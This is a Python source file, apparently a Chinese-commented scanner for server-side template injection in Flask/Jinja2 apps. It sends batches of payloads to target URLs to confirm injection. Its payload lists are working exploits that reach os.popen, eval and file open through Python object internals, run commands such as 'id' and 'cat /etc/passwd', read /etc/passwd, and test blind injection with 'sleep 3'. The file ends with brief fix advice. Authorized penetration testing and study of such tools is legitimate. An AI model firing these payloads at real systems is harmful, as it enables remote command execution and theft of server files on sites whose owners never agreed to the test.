#!/usr/bin/env python3
"""
SSTI 漏洞扫描器
===============
支持扫描 Flask (Jinja2) 模板注入漏洞

检测类型：
  1. 基础注入检测 ({{7*7}})
  2. 下标/属性访问 (config, __class__, __mro__, __subclasses__)
  3. 命令执行 (popen, subprocess, os.popen)
  4. 文件读取 (open, read)
  5. eval 函数执行
  6. 盲注检测 (基于延时或出网)

用法：
  python3 ssti_scanner.py -u <url> [参数]
  python3 ssti_scanner.py -u <url> --param name -X POST -d "name=INJECT"
  python3 ssti_scanner.py -f urls.txt
"""

import requests
import urllib.parse
import sys
import re
import time
import argparse
import json
from datetime import datetime

# ==============================================================
# 输出颜色
# ==============================================================
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"
BOLD = "\033[1m"


def banner():
    print(f"""{CYAN}
  ╔══════════════════════════════════════╗
  ║        SSTI Scanner v1.0            ║
  ║   Flask / Jinja2 模板注入扫描器      ║
  ╚══════════════════════════════════════╝{RESET}
""")


# ==============================================================
# SSTI 检测 Payloads
# ==============================================================

# 基础检测：检测模板引擎是否解析了表达式
BASIC_PAYLOADS = [
    ("{{7*7}}", "49"),                     # 基础运算
    ("{{7*'7'}}", "7777777"),              # 字符串乘法
    ("{{config}}", "Config"),              # Flask配置对象
    ("{{self}}", "<TemplateReference"),    # 模板引用
    ("{{''.__class__}}", "str"),           # 获取字符串类
]

# 属性/下标访问链 — 获取基类和子类
SUBCLASS_PAYLOADS = [
    ("{{''.__class__.__mro__[1].__subclasses__()}}", "<class"),
    ("{{''.__class__.__mro__[2].__subclasses__()}}", "<class"),
    ("{{().__class__.__bases__[0].__subclasses__()}}", "<class"),
    ("{{''.__class__.__mro__[1].__subclasses__()[150]}}", "<class"),
    ("{{().__class__.__bases__[0].__subclasses__()[150]}}", "<class"),
]

# 命令执行 Payloads
CMD_PAYLOADS = [
    ("{{''.__class__.__mro__[1].__subclasses__()[150].__init__.__globals__['popen']('id').read()}}", "uid="),
    ("{{''.__class__.__mro__[1].__subclasses__()[150].__init__.__globals__['popen']('whoami').read()}}", ""),
    ("{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", "uid="),
    ("{{''.__class__.__mro__[1].__subclasses__()[150].__init__.__globals__['os'].popen('id').read()}}", "uid="),
    ("{{lipsum.__globals__['os'].popen('id').read()}}", "uid="),
    ("{{cycler.__init__.__globals__.os.popen('id').read()}}", "uid="),
    ("{{joiner.__init__.__globals__.os.popen('id').read()}}", "uid="),
    ("{{namespace.__init__.__globals__.os.popen('id').read()}}", "uid="),
    ("{{config.__class__.__init__.__globals__['os'].__dict__['popen']('id').read()}}", "uid="),
    ("{{''.__class__.__mro__[1].__subclasses__()[150].__init__.__globals__['popen']('cat /etc/passwd').read()}}", "root:"),
]

# 文件读取 Payloads
FILE_READ_PAYLOADS = [
    ("{{config.__class__.__init__.__globals__['os'].__dict__['popen']('cat /etc/passwd').read()}}", "root:"),
    ("{{get_flashed_messages.__globals__.__builtins__.open('/etc/passwd').read()}}", "root:"),
    ("{{''.__class__.__mro__[1].__subclasses__()[150].__init__.__globals__['builtins'].open('/etc/passwd').read()}}", "root:"),
    ("{{lipsum.__globals__['builtins'].open('/etc/passwd').read()}}", "root:"),
]

# eval 函数执行 Payloads
EVAL_PAYLOADS = [
    ("{{''.__class__.__mro__[1].__subclasses__()[150].__init__.__globals__['builtins']['eval']('__import__(\"os\").popen(\"id\").read()')}}", "uid="),
    ("{{config.__class__.__init__.__globals__['builtins']['eval']('__import__(\"os\").popen(\"id\").read()')}}", "uid="),
    ("{{lipsum.__globals__['builtins'].eval('__import__(\"os\").popen(\"id\").read()')}}", "uid="),
]

# 所有 Payloads 汇总
ALL_PAYLOADS = (
    [("基础检测", BASIC_PAYLOADS),
     ("属性/下标访问", SUBCLASS_PAYLOADS),
     ("命令执行", CMD_PAYLOADS),
     ("文件读取", FILE_READ_PAYLOADS),
     ("eval执行", EVAL_PAYLOADS)]
)


# ==============================================================
# 核心扫描函数
# ==============================================================

class SSTIScanner:
    def __init__(self, url, param=None, method="GET", data=None, cookies=None, headers=None, timeout=10, proxy=None):
        self.url = url
        self.param = param
        self.method = method.upper()
        self.data_template = data or ""
        self.cookies = cookies or {}
        self.headers = headers or {"User-Agent": "Mozilla/5.0 SSTIScanner/1.0"}
        self.timeout = timeout
        self.proxy = {"http": proxy, "https": proxy} if proxy else None
        self.session = requests.Session()
        self.vulns = []
        self.info = {}

    def send_payload(self, payload):
        """发送 Payload 并返回响应文本"""
        try:
            if self.param:
                params = {self.param: payload}
                if self.method == "GET":
                    resp = self.session.get(
                        self.url, params=params,
                        headers=self.headers, cookies=self.cookies,
                        timeout=self.timeout, proxies=self.proxy
                    )
                else:
                    # POST — 用表单格式发送，requests自动处理编码
                    resp = self.session.post(
                        self.url, data=params,
                        headers=self.headers, cookies=self.cookies,
                        timeout=self.timeout, proxies=self.proxy
                    )
            elif "INJECT" in self.url:
                # URL中的INJECT占位符
                inject_url = self.url.replace("INJECT", urllib.parse.quote_plus(payload))
                resp = self.session.get(
                    inject_url,
                    headers=self.headers, cookies=self.cookies,
                    timeout=self.timeout, proxies=self.proxy
                )
            else:
                # 自定POST data
                post_data = self.data_template.replace("INJECT", payload)
                resp = self.session.post(
                    self.url, data=post_data,
                    headers=self.headers, cookies=self.cookies,
                    timeout=self.timeout, proxies=self.proxy
                )
            return resp.text
        except requests.exceptions.Timeout:
            return "TIMEOUT"
        except Exception as e:
            return f"ERROR: {e}"

    def check_basic(self):
        """基础注入检测"""
        print(f"\n{YELLOW}[*] 基础注入检测...{RESET}")
        findings = []

        for payload, expected in BASIC_PAYLOADS:
            text = self.send_payload(payload)
            # 检查原始payload结果是否出现在响应中
            if expected in text and "TIMEOUT" not in text and "ERROR" not in text:
                # 提取payload附近的回显
                snippet = ""
                if expected in text:
                    idx = text.index(expected)
                    snippet = text[max(0,idx-20):idx+len(expected)+80].replace("\n"," ")
                findings.append((payload, expected, snippet[:200]))
                print(f"  {GREEN}[发现] 基础注入: {payload[:50]}...{RESET}")
                print(f"        回显: {snippet[:80].strip()}")

        # 额外检测：看看响应与正常是否不同
        baseline = self.send_payload("{{1}}")
        for calc in ["{{7*7}}", "{{7+7}}", "{{config}}", "{{''.__class__}}"]:
            text = self.send_payload(calc)
            if text != baseline and text != baseline + "\n" and len(text) != len(baseline):
                if any(x in text for x in ["49", "14", "Config", "SECRET_KEY", "class 'str'", "<class"]):
                    if not any(calc in f[0] for f in findings):
                        snippet = ""
                        for kw in ["49","14","Config","SECRET_KEY","class 'str'"]:
                            if kw in text:
                                idx = text.index(kw)
                                snippet = text[max(0,idx-10):idx+len(kw)+50].replace("\n"," ")
                                break
                        findings.append((calc, "检测到运算结果/配置回显", snippet[:200]))
                        print(f"  {GREEN}[发现] 基础注入: {calc[:50]}...{RESET}")
                        if snippet:
                            print(f"        回显: {snippet[:80].strip()}")

        if not findings:
            print(f"  {RED}[-] 未检测到基础注入{RESET}")
        return findings

    def check_attr_access(self):
        """属性/下标访问检测"""
        print(f"\n{YELLOW}[*] 属性/下标访问检测...{RESET}")
        findings = []

        for payload, expected in SUBCLASS_PAYLOADS:
            text = self.send_payload(payload)
            if expected in text:
                findings.append((payload, "属性访问成功", text[:300]))
                print(f"  {GREEN}[发现] 属性访问: {payload[:60]}...{RESET}")

        if not findings:
            print(f"  {RED}[-] 未找到可用的属性访问链{RESET}")
        return findings

    def check_cmd_exec(self):
        """命令执行检测"""
        print(f"\n{YELLOW}[*] 命令执行检测...{RESET}")
        findings = []

        for payload, expected in CMD_PAYLOADS:
            text = self.send_payload(payload)
            if expected in text and "TIMEOUT" not in text:
                # 提取命令回显
                match = re.search(r'(uid=.*?)[<"]', text)
                result = match.group(1) if match else text[:150]
                findings.append((payload, "命令执行成功", result))
                print(f"  {GREEN}[高危] 命令执行: {result}{RESET}")
                return findings  # 找到一个就行

        if not findings:
            print(f"  {RED}[-] 未找到命令执行链{RESET}")
        return findings

    def check_file_read(self):
        """文件读取检测"""
        print(f"\n{YELLOW}[*] 文件读取检测...{RESET}")
        findings = []

        for payload, expected in FILE_READ_PAYLOADS:
            text = self.send_payload(payload)
            if expected in text:
                match = re.search(r'(root:.*?)[<"]', text)
                result = match.group(1) if match else text[:200]
                findings.append((payload, "文件读取成功", result))
                print(f"  {GREEN}[高危] 文件读取: {result[:80]}...{RESET}")
                return findings

        if not findings:
            print(f"  {RED}[-] 未找到文件读取链{RESET}")
        return findings

    def check_eval(self):
        """eval 函数执行检测"""
        print(f"\n{YELLOW}[*] eval 函数执行检测...{RESET}")
        findings = []

        for payload, expected in EVAL_PAYLOADS:
            text = self.send_payload(payload)
            if expected in text:
                findings.append((payload, "eval执行成功", text[:200]))
                print(f"  {GREEN}[高危] eval执行: {text[:80]}{RESET}")
                return findings

        if not findings:
            print(f"  {RED}[-] 未找到eval执行链{RESET}")
        return findings

    def check_blind(self):
        """盲注检测 — 基于延时"""
        print(f"\n{YELLOW}[*] 盲注检测（延时）...{RESET}")
        findings = []

        blind_payloads = [
            "{{config.__class__.__init__.__globals__['os'].popen('sleep 3').read()}}",
            "{{''.__class__.__mro__[1].__subclasses__()[150].__init__.__globals__['os'].popen('sleep 3').read()}}",
            "{{lipsum.__globals__['os'].popen('sleep 3').read()}}",
            "{{cycler.__init__.__globals__.os.popen('sleep 3').read()}}",
        ]

        baseline = self.send_payload("{{1}}")
        baseline_time = len(baseline)

        for payload in blind_payloads:
            start = time.time()
            text = self.send_payload(payload)
            elapsed = time.time() - start

            if elapsed > 2:
                findings.append((payload, f"延时盲注: {elapsed:.1f}s", text[:100]))
                print(f"  {GREEN}[发现] 盲注: 响应延迟{elapsed:.1f}s{RESET}")
                return findings

        print(f"  {RED}[-] 未检测到延时盲注{RESET}")
        return findings

    def scan(self):
        """全量扫描"""
        print(f"\n{CYAN}═══════════════════════════════════════════{RESET}")
        print(f"{CYAN}  目标: {self.url}{RESET}")
        print(f"{CYAN}  方法: {self.method}{RESET}")
        if self.param:
            print(f"{CYAN}  参数: {self.param}{RESET}")
        print(f"{CYAN}═══════════════════════════════════════════{RESET}")

        results = {}

        # 1. 基础检测
        basic = self.check_basic()
        if basic:
            results["基础注入"] = basic
            self.vulns.extend(basic)

        # 2. 属性访问
        attr = self.check_attr_access()
        if attr:
            results["属性/下标访问"] = attr
            self.vulns.extend(attr)

        # 3. 命令执行（如果有基础注入才试）
        if basic:
            cmd = self.check_cmd_exec()
            if cmd:
                results["命令执行"] = cmd
                self.vulns.extend(cmd)

            file_read = self.check_file_read()
            if file_read:
                results["文件读取"] = file_read
                self.vulns.extend(file_read)

            eval_res = self.check_eval()
            if eval_res:
                results["eval执行"] = eval_res
                self.vulns.extend(eval_res)

            blind = self.check_blind()
            if blind:
                results["盲注"] = blind
                self.vulns.extend(blind)

        return results

    def report(self, results):
        """生成报告"""
        print(f"\n{CYAN}{'='*60}{RESET}")
        print(f"{BOLD}  扫描报告{RESET}")
        print(f"{CYAN}{'='*60}{RESET}")
        print(f"  目标: {self.url}")
        print(f"  时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"{'='*60}")

        if not self.vulns:
            print(f"\n{GREEN}[安全] 未检测到 SSTI 漏洞{RESET}")
        else:
            print(f"\n{RED}[!] 发现 {len(self.vulns)} 个潜在漏洞:{RESET}")
            for i, (payload, vuln_type, detail) in enumerate(self.vulns, 1):
                print(f"\n{RED}  ── 漏洞 #{i} ──{RESET}")
                print(f"     类型: {BOLD}{vuln_type}{RESET}")
                print(f"     Payload: {payload[:100]}")
                print(f"     回显: {str(detail)[:150].strip()}")

        print(f"\n{YELLOW}建议修复:{RESET}")
        print("  1. 使用 render_template 替代 render_template_string")
        print("  2. 对用户输入进行转义 (如 {{ 替换为 &lbrace;&lbrace;)")
        print("  3. 使用沙箱环境运行模板渲染")
        print(f"\n{CYAN}{'='*60}{RESET}\n")


# ==============================================================
# 主函数
# ==============================================================

def main():
    banner()

    parser = argparse.ArgumentParser(description="SSTI 漏洞扫描器 (Flask/Jinja2)")
    parser.add_argument("-u", "--url", help="目标URL（用 INJECT 标记注入点）")
    parser.add_argument("-p", "--param", help="参数名，如 name, code")
    parser.add_argument("-X", "--method", default="GET", help="请求方法 GET/POST")
    parser.add_argument("-d", "--data", default="", help="POST数据，用 INJECT 占位")
    parser.add_argument("--cookie", default="", help="Cookie")
    parser.add_argument("--proxy", default="", help="代理地址")
    parser.add_argument("-f", "--file", help="URL列表文件")
    parser.add_argument("-o", "--output", help="输出JSON结果到文件")
    args = parser.parse_args()

    targets = []

    if args.file:
        with open(args.file) as f:
            targets = [line.strip() for line in f if line.strip()]
    elif args.url:
        targets = [args.url]
    else:
        parser.print_help()
        print(f"\n{YELLOW}示例:{RESET}")
        print(f"  python3 ssti_scanner.py -u 'http://target.com/?name=INJECT'")
        print(f"  python3 ssti_scanner.py -u 'http://target.com/' -p name")
        print(f"  python3 ssti_scanner.py -u 'http://target.com/' -p code -X POST -d 'code=INJECT'")
        print(f"  python3 ssti_scanner.py -f urls.txt -o result.json")
        sys.exit(1)

    all_results = {}

    for target in targets:
        scanner = SSTIScanner(
            url=target,
            param=args.param,
            method=args.method,
            data=args.data,
            cookies={} if not args.cookie else dict(c.split("=", 1) for c in args.cookie.split("; ")),
            proxy=args.proxy,
        )
        results = scanner.scan()
        scanner.report(results)
        all_results[target] = results

    if args.output:
        with open(args.output, "w") as f:
            json.dump(all_results, f, indent=2, ensure_ascii=False)
        print(f"{GREEN}[+] 结果已保存到 {args.output}{RESET}")


if __name__ == "__main__":
    main()
